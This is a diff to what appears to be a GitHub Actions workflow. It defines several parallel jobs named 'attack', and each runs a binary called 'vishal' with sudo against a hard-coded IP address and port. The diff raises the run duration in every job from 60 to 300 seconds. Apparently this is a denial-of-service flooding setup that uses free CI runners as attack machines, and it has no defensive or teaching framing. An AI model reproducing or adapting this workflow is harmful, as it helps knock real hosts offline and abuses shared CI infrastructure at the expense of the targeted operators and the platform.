@@ -9,32 +9,32 @@ jobs:
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x vishal
-      - run: sudo ./vishal 20.198.110.161 13090 60
+      - run: sudo ./vishal 20.198.110.161 13090 300
   
   attack2:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x vishal
-      - run: sudo ./vishal 20.198.110.161 13090 60
+      - run: sudo ./vishal 20.198.110.161 13090 300
   
   attack3:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x vishal
-      - run: sudo ./vishal 20.198.110.161 13090 60
+      - run: sudo ./vishal 20.198.110.161 13090 300
   
   attack4:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x vishal
-      - run: sudo ./vishal 20.198.110.161 13090 60
+      - run: sudo ./vishal 20.198.110.161 13090 300
   
   attack5:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v3
       - run: chmod +x vishal
-      - run: sudo ./vishal 20.198.110.161 13090 60
+      - run: sudo ./vishal 20.198.110.161 13090 300
